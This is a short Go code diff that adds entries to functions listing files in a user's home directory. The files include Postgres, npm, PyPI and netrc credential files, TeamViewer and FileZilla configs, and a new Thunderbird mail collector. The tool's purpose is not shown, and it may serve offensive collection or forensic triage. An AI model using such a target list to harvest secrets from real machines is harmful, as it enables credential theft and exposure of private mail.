@@ -33,6 +33,7 @@ func SqlCollector(userHome string) []string {
 		filepath.Join(userHome, ".psql_history"),          // Postgres history
 		filepath.Join(userHome, ".dbshell"),               // DBShell history
 		filepath.Join(userHome, ".pgpass"),                // Postgres Pass
+		filepath.Join(userHome, ".config/sqlitebrowser/sqlitebrowser.conf"), 
 	}
 	return paths
 }
@@ -112,6 +113,15 @@ func MiscCollector(userHome string) []string {
 		filepath.Join(userHome, ".npmrc"),                 // NPM credentials
 		filepath.Join(userHome, ".pypirc"),                // Python package repository credentials
 		filepath.Join(userHome, ".netrc"),                 // Netrc (generic credentials)
+		filepath.Join(userHome, ".config/teamviewer/clients.conf"), // teamviewer conf
+		filepath.Join(userHome, ".filezilla"),
+	}
+	return paths
+}
+
+func MailCollector(userHome string) []string {
+	paths := []string{
+		filepath.Join(userHome, ".thunderbird"),
 	}
 	return paths
 }
